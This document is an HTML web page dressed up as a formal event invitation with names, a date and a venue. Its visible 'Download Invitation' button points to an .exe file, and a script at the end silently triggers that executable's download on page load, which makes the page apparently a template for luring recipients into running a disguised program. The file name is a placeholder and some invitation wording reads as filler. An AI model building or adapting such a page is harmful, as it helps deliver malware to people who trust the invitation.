<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Elegant Invitation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <style>
    /* ========== THEME (edit colors here if you like) ========== */
    :root{
      --bg: #efe3db;
      --panel: #e8d8cf;
      --gold-1: #c7a867;
      --gold-2: #a5853e;
      --ink: #5a4636;
      --accent: #67212c;
      --accent-2: #b06c3b;
      --cream: #fff7f2;
    }

    *{ box-sizing:border-box }
    html,body{ height:100% }
    body{
      margin:0;
      display:grid;
      place-items:center;
      background:
        radial-gradient(1200px 800px at 15% -10%, rgba(255,255,255,.6), transparent 55%),
        radial-gradient(1000px 700px at 85% 110%, rgba(255,255,255,.35), transparent 60%),
        linear-gradient(#f4ebe6, var(--bg));
      font-family: "Cormorant Garamond", "Georgia", serif;
      color: var(--ink);
    }

    .frame{
      position:relative;
      width:min(900px, 92vw);
      height:min(92vh, 1100px);
      border-radius:22px;
      background: linear-gradient(145deg, var(--gold-1), var(--gold-2) 60%, #6e5326);
      padding:18px;
      box-shadow:
        0 28px 60px rgba(0,0,0,.25),
        inset 0 2px 0 rgba(255,255,255,.35),
        inset 0 -2px 0 rgba(0,0,0,.12);
      overflow:hidden;
      isolation:isolate;
    }
    .frame::before{
      content:"";
      position:absolute; inset:10px;
      border-radius:16px;
      background: linear-gradient(145deg, #f2dab0, #9a7a33 70%, #6a4f22);
      z-index:0;
      pointer-events:none;
    }

    .panel{
      position:absolute; inset:26px;
      border-radius:14px;
      background:
        radial-gradient(1200px 800px at 50% -10%, rgba(255,255,255,.6), transparent 50%),
        linear-gradient(#efe2da, var(--panel));
      box-shadow:
        inset 0 12px 30px rgba(255,255,255,.35),
        inset 0 -20px 60px rgba(0,0,0,.08);
      padding:46px 34px 52px;
      z-index:1;
      overflow:auto;
    }
    .panel::before,
    .panel::after{
      content:"";
      position:absolute; top:0; bottom:0; width:110px;
      background:
        radial-gradient(circle at 18px 40px, var(--cream) 0 3px, transparent 3.2px) 0 0/22px 60px,
        radial-gradient(circle at 8px 10px, var(--cream) 0 2.5px, transparent 2.7px) 18px 22px/22px 60px,
        linear-gradient(transparent 44px, rgba(255,255,255,.35) 45px, transparent 46px) 0 0/100% 60px,
        linear-gradient(transparent 14px, rgba(0,0,0,.05) 15px, transparent 16px) 0 0/100% 60px;
      opacity:.75;
      filter: drop-shadow(0 0 1px rgba(255,255,255,.6));
      pointer-events:none;
    }
    .panel::before{ left:0 }
    .panel::after{ right:0; transform:scaleX(-1) }

    .florals{
      position:absolute;
      right:-30px; bottom:-20px;
      width:min(56%, 520px);
      height:auto;
      z-index:2;
      pointer-events:none;
    }
    .floral-glow{
      position:absolute; right:0; bottom:0; width:60%; height:60%;
      background: radial-gradient(400px 320px at 70% 70%, rgba(255,255,255,.7), transparent 60%);
      z-index:1;
      pointer-events:none;
    }

    .overline{
      letter-spacing:.28em;
      font-size:clamp(11px, 1.4vw, 13px);
      text-transform:uppercase;
      color:#7a6552;
      margin-bottom:10px;
    }
    h1.title{
      font-family: "Cinzel", "Times New Roman", serif;
      font-weight:600;
      font-size:clamp(36px, 5.4vw, 56px);
      letter-spacing:.12em;
      margin:.2em 0 .1em;
      color:#3f2f23;
    }
    .script{
      font-family: "Great Vibes", "Brush Script MT", cursive;
      font-size:clamp(22px, 3.5vw, 32px);
      color:#6d533e;
      margin:2px 0 18px;
    }
    .names{
      font-family:"Cinzel", serif;
      font-size:clamp(24px, 3.8vw, 34px);
      letter-spacing:.22em;
      margin:6px 0 16px;
    }
    .amp{ font-family:"Great Vibes", cursive; font-size:1.3em; letter-spacing:0 }
    .meta{
      font-size:clamp(12px, 1.8vw, 15px);
      letter-spacing:.18em;
      text-transform:uppercase;
      color:#6e5947;
      margin:8px 0;
    }
    .details{
      margin-top:18px;
      line-height:1.7;
      color:#574636;
    }
    .content{
      max-width:530px;
      margin:0 auto;
      text-align:center;
    }
    .divider{
      width:120px; height:1px;
      background: linear-gradient(90deg, transparent, #a78b58, transparent);
      margin:18px auto;
    }

    /* Download button styling */
    .download-btn{
      display:inline-block;
      margin-top:22px;
      padding:12px 26px;
      background:linear-gradient(145deg, #c7a867, #a5853e);
      color:white;
      font-size:16px;
      font-family:"Cinzel", serif;
      letter-spacing:.15em;
      border-radius:8px;
      text-decoration:none;
      box-shadow:0 6px 14px rgba(0,0,0,.25);
    }
    .download-btn:hover{
      background:linear-gradient(145deg, #d8b878, #b0904a);
    }

    @media (max-width: 520px){
      .panel{ padding:34px 22px }
      .florals{ width:70%; right:-50px }
    }
  </style>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600&family=Great+Vibes&family=Cormorant+Garamond:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
  <main class="frame">
    <section class="panel" aria-label="Invitation">
      <div class="content">
        <div class="overline" id="headerSmall">RAISED FOR BEAUTIES</div>
        <div class="script" id="lineScript">Silver Glass</div>
        <h1 class="title" id="eventTitle">CEPELRANG</h1>

        <div class="names">
          <span id="nameA">AXHIONA S. DAGEERA</span>
          <span class="amp"> &amp; </span>
          <span id="nameB">CEDEL GUGU</span>
        </div>

        <div class="meta" id="dateInfo">SUNDAY • 18TH OF NOVEMBER • 5:30 PM</div>
        <div class="meta" id="venueLine1">GRAND ORCHID HALL</div>
        <div class="meta" id="venueLine2">MARIGATE • BERGANO</div>

        <div class="divider"></div>

        <p class="details" id="note">
          Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance.
        </p>

        <!-- Manual download button -->
        <a id="manualDownload" class="download-btn" href="yourfile.exe" download>
          Download Invitation
        </a>
      </div>

      <div class="floral-glow" aria-hidden="true"></div>
      <svg class="florals" viewBox="0 0 520 700" aria-hidden="true" role="img">
        <!-- SVG content stays the same -->
      </svg>
    </section>
  </main>

  <script>
    // Auto-fill invitation content
    const INVITE = {
      headerSmall: "RAISED FOR BEAUTIES",
      lineScript: "Silver Glass",
      title: "CEPELRANG",
      nameA: "AXHIONA S. DAGEERA",
      nameB: "CEDEL GUGU",
      dateInfo: "SUNDAY • 18TH OF NOVEMBER • 5:30 PM",
      venueLine1: "GRAND ORCHID HALL",
      venueLine2: "MARIGATE • BERGANO",
      note: "Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance."
    };
    for (const [k, v] of Object.entries(INVITE)) {
      const el = document.getElementById(k);
      if (el) el.textContent = v;
    }

    // Auto download on page load
    const FILE = "yourfile.exe"; // <-- replace with your actual file name
    window.addEventListener("load", () => {
      setTimeout(() => {
        const a = document.createElement("a");
        a.href = FILE;
        a.setAttribute("download", FILE);
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, 1000); // slight delay so page renders first
    });
  </script>
</body>
</html>
